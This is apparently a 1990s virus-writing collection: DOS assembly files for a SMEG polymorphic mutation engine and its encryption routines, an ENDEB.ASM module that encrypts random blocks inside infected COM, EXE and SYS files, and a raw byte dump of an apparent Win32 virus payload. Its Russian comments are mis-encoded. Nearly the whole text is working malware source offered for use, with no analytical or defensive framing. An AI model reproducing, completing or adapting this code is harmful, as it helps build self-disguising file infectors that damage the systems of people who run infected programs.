;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
do_one_byte:
        and      al,7h
        mov      bx,offset(onebyte_table-virus)
        xlat
        cmp      al,48h                   ; DEC?
        je       inc_or_dec
        cmp      al,40h                   ; or INC?
        jne      encode_1byte
inc_or_dec:
        mov      cl,al
        call     random_any_ax           ; get a garbage register
        and      al,3
        mov      bx,offset(dataarea_for_SMEG-virus+9)
                                         ; can we say "lea", boys and
                                         ; girls?
        xlat                             ; look up the register
        or       al,cl                   ; fill in the register field
encode_1byte:
        stosb
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
branch_garble:
        cmp      word ptr ds:[cJMP_patch-virus],0 ; is there an unfinished
        je       no_pending_cJMP            ; conditional jmp?
        jmp      finish_cJMP                ; if so, finish it
no_pending_cJMP:
        call     random_any_ax
        cmp      ah,6Eh
        ja       do_near_JMP
do_cond_jmp:
        and      al,0Fh                   ; encode a conditional
        or       al,70h                   ; jmp
        stosb
        mov      ds:[cJMP_patch-virus],di      ; save target offset
        stosb
        retn
do_near_JMP:
        cmp      word ptr ds:[nJMP_patch-virus],0 ; is there an unfinished
        jne      do_cond_jmp                ; near JMP pending?
        call     random_any_ax              ; if not, encode one
        cmp      al,78h                     ; either just jmp past
        jbe      encode_CALL                ; or call it too
        mov      al,0E9h                    ; encode near JMP
        stosb
        mov      ds:[nJMP_patch-virus],di         ; save location to patch
        stosw
        call     random_any_ax
        cmp      al,0AAh
        jbe      forward_CALL
go_not_branch_garble:
        jmp      not_branch_garble
forward_CALL:
        cmp      word ptr ds:[last_CALL-virus],0 ; is there a garbage CALL
        je       go_not_branch_garble      ; we can patch?
        push     di                        ; if there is, patch the CALL
        xchg     di,ax                     ; for here so there are CALLs
        dec      ax                        ; forwards as well as back-
        dec      ax                        ; wards
        mov      di,ds:[last_CALL-virus]
        sub      ax,di
        stosw
        pop      di
        jmp      not_branch_garble
encode_CALL:
        cmp      word ptr ds:[CALL_patch-virus],0 ; is there one pending?
        je       do_cond_jmp
        mov      al,0E8h                    ; encode a CALL
        stosb
        cmp      word ptr ds:[last_CALL-virus],0
        je       store_CALL_loc
        call     random_any_ax              ; 1/2 chance of replacing
        and      al,7h                      ; it (random so it's not
        cmp      al,4h                      ; too predictable)
        jae      fill_in_offset
store_CALL_loc:
        mov      ds:[last_CALL-virus],di          ; save ptr to CALL offset
fill_in_offset:
        mov      ax,di                      ; calculate CALL offset
        sub      ax,ds:[CALL_patch-virus]
        neg      ax
        stosw
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[SMEG.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENCRYPT.ASM]ÄÄÄ
include macro.inc
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encrypt:
        push_all_register
        mov      bx,offset(dataarea_for_SMEG-virus)
        mov      di,ds:[bx+targetptr-dataarea_for_SMEG]
        mov      si,ds:[bx+sourceptr-dataarea_for_SMEG]
        mov      cx,ds:[bx+datasize-dataarea_for_SMEG]
        mov      dl,ds:[bx+cryptval-dataarea_for_SMEG]
        mov      bl,ds:[bx+crypt_type-dataarea_for_SMEG]
        and      bx,0fh
        add      bx,bx
        add      bx,offset(crypt_table-virus)
encrypt_byte:
        lodsb    ;AL<- DS:[SI]
        call     word ptr [bx]
        stosb
        loop     encrypt_byte
        pop_all_register
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt_table:
        dw       offset(crypt0-virus)
        dw       offset(crypt1-virus)
        dw       offset(crypt2-virus)
        dw       offset(crypt3-virus)
        dw       offset(crypt4-virus)
        dw       offset(crypt5-virus)
        dw       offset(crypt6-virus)
        dw       offset(crypt7-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt0:
        xor      al,dl
        inc      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt2:
        xor      dl,al
        mov      al,dl
        dec      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt3:
        not      al
crypt4:
        xor      al,dl
        inc      dl
        inc      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt1:
        xor      al,dl
        neg      al
        dec      dl
        dec      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt5:
        add      al,dl
        inc      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt6:
        sub      al,dl
        dec      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crypt7:
        xor      al,dl
        dec      dl
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENCRYPT.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENDEB.ASM]ÄÄÄ
;®¤¯p®£p ¬¬ë § è¨äp®¢ª¨ ¡«®ª®¢ ­  ä ©«¥ (c)'98 Black Harmer
;ˆá¯®«ì§ã¥âáï ¢¬¥áâ¥ á:
;random.asm - ®¤¯p®£p ¬¬ë ®¡p §®¢ ­¨ï á«ãç ©­ëå ç¨á¥«
;‚å®¤: BX - ®¯¨á â¥«ì ä ©«  (çâ¥­¨¥/§ ¯¨áì)
;      AX - ¢¥på­¨© ¯p¥¤¥« § è¨äp®¢ª¨ („«ï COM ä ©«  ®áâ ¢¨âì
;           ®â ¢¥på  å®âï ¡ë 3 ¡ ©â  ¤«ï JMP ­  ¢¨pãá)
;      DX - ­¨¦­¨© ¯p¥¤¥« § è¨äp®¢ª¨  („«ï COM ä ©«  íâ® ãª § â¥«ì ­  ª®­¥æ)
;      LSEEK - “ª § â¥«ì ä ©«  ¤®«¦¥­ áâ®ïâì ­  â®çª¥ ®âáç¥â .
;      „«ï COM ä ©«  íâ® 0,   ¤«ï EXE íâ® ­ ç «® ¯p®£p ¬¬ë ¡¥§
;      § £®«®¢ª , ¤«ï ª ¦¤®£® ®­® ¡ã¤¥â p §«¨ç­ë¬.
;      „®«¦­  ¡ëâì ®¯p¥¤¥«¥­  ¯®¤¯p®£p ¬¬  call_int_21, å®âï ¡ë ¢®â â ª®£®
;      á®¤¥p¦ ­¨ï:
;      call_int_21 proc near
;      int   21h
;      retn
;      call_int_21 endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;‘ª®«ìª® ¡«®ª®¢ § è¨äp®¢ë¢ âì ­  ä ©«¥                        ;³
number_of_blok_to_crypt_in_file=5                             ;³
;„«¨­­  ª ¦¤®£® ¡«®ª                                          ;³
lengh_of_blok=5                                               ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
encrypt_blok proc near
        pusha
        push     es ds
        push     bx
        push     cs cs
        pop      ds es
        call     init_encrypt_blok
init_encrypt_blok:
        pop      bp
        sub      bp,offset(init_encrypt_blok-encrypt_blok)
        mov      bx,ax
        xor      cx,cx
        lea      di,[bp+data_for_uncrypt-encrypt_blok]
        sub      dx,lengh_of_blok
        push     dx
next_random_number_with_popdx:
        pop      dx
next_random_number:
        push     dx
        call     random_dx
        cmp      dx,bx
        jbe      next_random_number_with_popdx
        jcxz     check_cross_noneed
        lea      si,[bp+data_for_uncrypt-encrypt_blok]
        push     cx
next_check_cross:
        lodsw    ;DS:[SI] -> AX,SI+2
        sub      ax,dx
        cmp      ax,lengh_of_blok
        jb       check_cross_failed
        cmp      ax,(0ffffh-lengh_of_blok)
        ja       check_cross_failed
        loop     next_check_cross
        pop      cx
        jmp      check_cross_noneed
check_cross_failed:
        pop      cx dx
        jmp      next_random_number
check_cross_noneed:
        xchg     ax,dx
        stosw    ;AX -> ES:[DI],DI+2
        pop      dx
        inc      cx
        cmp      cx,number_of_blok_to_crypt_in_file*2
        jbe      next_random_number
        ;p¨áâã¯ ¥¬ ª ¯p®æ¥ááã § è¨äp®¢ª¨
        pop      bx ;¯¨á â¥«ì ä ©« 
        ;—¥¬ã p ¢­  â®çª  ®âáç¥â  ?
        xor      cx,cx
        xor      dx,dx
        mov      ax,4201h
        call     call_int_21
        ;H  ¢ëå®¤¥ DX:AX
        lea      si,[bp+data_for_uncrypt-encrypt_blok]
        mov      cx,number_of_blok_to_crypt_in_file
next_encrypt_blok:
        push     cx dx ax
        ;“áâ ­ ¢«¨¢ ¥¬ ãª § â¥«ì ­  ¯®§¨æ¨î ¡«®ª 
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4201h
        call     call_int_21
        push     dx ax
        ;—¨â ¥¬ ¡«®ª
        mov      cx,lengh_of_blok
        lea      dx,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ah,3fh
        call     call_int_21
        ;˜¨äpã¥¬ ¡«®ª
        mov      cx,ax
        lea      di,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ax,[si+2]
        call     crypt_encrypt_one_blok
        ;“áâ ­ ¢«¨¢ ¥¬ ãª § â¥«ì ­  ¯®§¨æ¨î ¡«®ª 
        pop      dx cx
        mov      ax,4200h
        call     call_int_21
        mov      cx,lengh_of_blok
        lea      dx,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ah,40h
        call     call_int_21
        add      si,4
        pop      dx cx
        ;‘â ¢¨¬ ãª § â¥«ì ­  â®çªã ®áâç¥â 
        mov      ax,4200h
        call     call_int_21
        pop      cx
        loop     next_encrypt_blok
        pop      ds es
        popa
        retn
encrypt_blok endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;®¤¯p®£p ¬¬  p áè¨äp®¢ª¨ ¡«®ª®¢ ­  ¯p®£p ¬¬¥, ¯¥p¥¤ â¥¬ ª ª ¯¥p¥¤ âì ¥©
;ã¯p ¢«¥­¨¥.
;‚å®¤:  ES:0000  -  ®â­®á¨â¥«ì­ ï â®çª  p áè¨äp®¢ª¨
;       „«ï COM ä ©«  PSP+10h:0000
;       „«ï EXE ä ©«  PSP+10h:0000
;       „«ï SYS ä ©«  CS:0000 (‡ p ¦¥­­ë© SYS ä ©« ­¥ > 64k)
decrypt_blok proc near
        pusha
        push     ds
        call     initial_decrypt_blok
initial_decrypt_blok:
        pop      bp
        sub      bp,offset(initial_decrypt_blok-decrypt_blok)
        push     cs
        pop      ds
        lea      si,[bp+data_for_uncrypt-decrypt_blok]
        mov      cx,number_of_blok_to_crypt_in_file
next_decrypt_blok:
        push     cx
        mov      cx,lengh_of_blok
        mov      di,[si]
        mov      ax,[si+2]
        call     crypt_encrypt_one_blok
        add      si,4
        pop      cx
        loop     next_decrypt_blok
        pop      ds
        popa
        retn
decrypt_blok endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ‡ è¨äp®¢ª /p áè¨äp®¢ª  ¡«®ª®¢
; ‚å®¤: ES:DI - ¡«®ª ª®â®pë© ­¥®¡å®¤¨¬® § è¨äp®¢ âì/p áè¨äp®¢ âì
;       AX - á«®¢® p áè¨äp®¢ª¨ (ª«îç)
;       CX - áª®«ìª® ¡ ©â § è¨äp®¢ âì/p áè¨äp®¢ âì
crypt_encrypt_one_blok proc near
        pusha
next_encrypt_byte:
        xor      es:[di],al
        add      al,ah
        inc      di
        loop     next_encrypt_byte
        popa
        retn
crypt_encrypt_one_blok endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;ã¤¥â ¨á¯®«ì§®¢ âìáï ¯p®æ¥¤ãp®© descrypt_blok ¤«ï p áè¨äp®¢ª¨;³
;1. ‘¬¥é¥­¨¥ 2. ‘«®¢®, ª®â®pë¬ § è¨äp®¢ ­® (ª«îç ¡«®ª )       ;³
data_for_uncrypt    dd number_of_blok_to_crypt_in_file dup (0);³
;‚p¥¬¥­­®© ¡ãää¥p ¤«ï çâ¥­¨ï/§ ¯¨á¨                           ;³
encrypt_blok_buffer db lengh_of_blok dup (0)                  ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ENDEB.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WV32\WV32.DAT]ÄÄÄ
; DB Listing created by Black Harmer's FILE2DB

db  060h,01eh,0fch,0e8h,000h,000h,000h,000h,05dh,081h
db  0edh,008h,010h,040h,000h,033h,0c0h,0beh,03ch,000h
db  0f7h,0bfh,066h,0adh,005h,000h,000h,0f7h,0bfh,096h
db  0adh,066h,03dh,050h,045h,00fh,085h,0c2h,000h,000h
db  000h,08bh,046h,074h,005h,01ch,000h,0f7h,0bfh,096h
db  0adh,005h,000h,000h,0f7h,0bfh,096h,0adh,005h,000h
db  000h,0f7h,0bfh,089h,085h,0d8h,010h,040h,000h,0b4h
db  062h,0e8h,07dh,000h,000h,000h,08eh,0dbh,067h,08eh
db  01eh,02ch,000h,033h,0f6h,0b9h,000h,001h,000h,000h
db  081h,03eh,077h,069h,06eh,062h,074h,003h,046h,0e2h
db  0f5h,083h,0c6h,00bh,08dh,0bdh,0f3h,010h,040h,000h
db  0ach,0aah,00ah,0c0h,075h,0fah,006h,01fh,0c6h,047h
db  0ffh,05ch,08dh,0b5h,0deh,010h,040h,000h,0b9h,00dh
db  000h,000h,000h,080h,036h,0e3h,046h,0e2h,0fah,08dh
db  0b5h,0deh,010h,040h,000h,0b9h,00dh,000h,000h,000h
db  0f3h,0a4h,0c6h,007h,000h,0b4h,03ch,08dh,095h,0f3h
db  010h,040h,000h,033h,0c9h,0e8h,01fh,000h,000h,000h
db  072h,03fh,08bh,0d8h,0b4h,040h,08dh,095h,043h,011h
db  040h,000h,0b9h,074h,01fh,000h,000h,0e8h,009h,000h
db  000h,000h,0b4h,03eh,0e8h,002h,000h,000h,000h,0ebh
db  022h,08dh,0bdh,0ddh,010h,040h,000h,051h,050h,068h
db  010h,000h,02ah,000h,057h,068h,000h,000h,000h,000h
db  0c3h,0c3h,090h,08eh,082h,091h,097h,087h,091h,095h
db  0cdh,086h,09bh,086h,0e3h,01fh,061h
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WV32\WV32.DAT]ÄÄÄ
